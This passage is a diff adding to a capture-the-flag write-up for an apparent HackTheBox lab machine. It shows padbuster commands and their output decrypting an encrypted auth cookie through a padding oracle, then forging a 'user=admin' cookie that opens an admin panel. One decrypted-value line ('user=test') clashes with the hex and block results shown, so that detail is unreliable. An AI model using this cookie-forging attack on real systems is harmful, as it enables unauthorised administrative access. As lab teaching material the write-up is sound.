@@ -164,4 +164,113 @@ by Ben "epi" Risher 🤓                 ver: 2.3.1
 [####################] - 4m     59998/59998   238/s   http://10.10.11.119/home/profile
 ```
 
-Cool, let's check the results. The pages in `/config` return empty responses (as feroxbuster shows, 0 lines, 0 words). `/home/logs.php` returns a 200 with just a body of Unauthorized.
+Cool, let's check the results. The pages in `/config` return empty responses (as feroxbuster shows, 0 lines, 0 words). `/home/logs.php` returns a 200 with just a body of Unauthorized. That will not help for now.
+
+Instead, we may be able to use the available paddding information of the cookie.  We will use padbuster to automate a bruteforcing method across the bytes to receive the decrypted plaintext. Here, we will add a valid cookie, the block size and to pass the item as a cookie.
+
+```
+ratcode404@kali$ padbuster http://10.10.11.119/ k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU 8 -cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU
+
++-------------------------------------------+
+| PadBuster - v0.3.3                        |
+| Brian Holyfield - Gotham Digital Science  |
+| labs@gdssecurity.com                      |
++-------------------------------------------+
+
+INFO: The original request returned the following
+[+] Status: 302
+[+] Location: home/index.php
+[+] Content Length: 16378
+
+INFO: Starting PadBuster Decrypt Mode
+*** Starting Block 1 of 2 ***
+
+INFO: No error string was provided...starting response analysis
+
+*** Response Analysis Complete ***
+
+The following response signatures were returned:
+
+-------------------------------------------------------
+ID#     Freq    Status  Length  Location
+-------------------------------------------------------
+1       1       200     16378   N/A
+2 **    255     302     0       ../logout.php?err=1
+-------------------------------------------------------
+
+Enter an ID that matches the error condition
+NOTE: The ID# marked with ** is recommended:
+```
+
+In this case, number 1 returns a 200 (the page) for one of the cookies, and number 2 returns a 302 to `logout.php` for the other 255 cookies. We choose '2' and it will continue brute-forcing the bytes of the cookie to get the plaintext.
+
+```
+NOTE: The ID# marked with ** is recommended : 2
+
+Continuing test with selection 2
+
+[+] Success: (188/256) [Byte 8]
+[+] Success: (89/256) [Byte 7]
+[+] Success: (24/256) [Byte 6]
+[+] Success: (168/256) [Byte 5]
+[+] Success: (78/256) [Byte 4]
+[+] Success: (174/256) [Byte 3]
+[+] Success: (73/256) [Byte 2]
+[+] Success: (18/256) [Byte 1]
+
+Block 1 Results:
+[+] Cipher Text (HEX): 5b4f1f86ec7e9568
+[+] Intermediate Bytes (HEX): e6b054b75ceba545
+[+] Plain Text: user=0xd
+
+*** Starting Block 2 of 2 ***
+
+[+] Success: (146/256) [Byte 8]
+[+] Success: (112/256) [Byte 7]
+[+] Success: (134/256) [Byte 6]
+[+] Success: (17/256) [Byte 5]
+[+] Success: (124/256) [Byte 4]
+[+] Success: (226/256) [Byte 3]
+[+] Success: (177/256) [Byte 2]
+[+] Success: (203/256) [Byte 1]
+
+Block 2 Results:
+[+] Cipher Text (HEX): c7dce25292e93514
+[+] Intermediate Bytes (HEX): 3d481881eb79926f
+[+] Plain Text: f
+
+-------------------------------------------------------
+** Finished ***
+
+[+] Decrypted value (ASCII): user=test
+
+[+] Decrypted value (HEX): 757365723D3078646607070707070707
+
+[+] Decrypted value (Base64): dXNlcj0weGRmBwcHBwcHBw==
+
+-------------------------------------------------------
+```
+
+Here we go. The decrypted ASCII value is of the form `user=[username]` Now, knowing what the underlying plaintext looks like, we can run it again with -plain user=admin to get back a valid cookie with that plaintext.
+
+`ratcode404@kali$ padbuster http://10.10.11.119/ k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU 8 -cookie auth=k8MxxWHb3SFbTx%2BG7H6VaMfc4lKS6TUU -plaintext user=admin`
+
+Awesome, this is the result.
+
+```
+-------------------------------------------------------
+** Finished ***
+
+[+] Encrypted value is: BAitGdYuupMjA3gl1aFoOwAAAAAAAAAA
+-------------------------------------------------------
+```
+
+When we use this cookie and refresh the browser, we have a new option 'Admin Panel'. 
+
+![adminmenu](https://i.imgur.com/oWczMcI.png)
+
+This panel leads to `http://10.10.11.119/admin_cms_panel/admin/login.php`, which is the login for a CMS instance.
+
+![cms](https://i.imgur.com/Jj39k1v.png)
+
+We will need to figure the admin login for the CMS, even though we have admin access to the main page already.
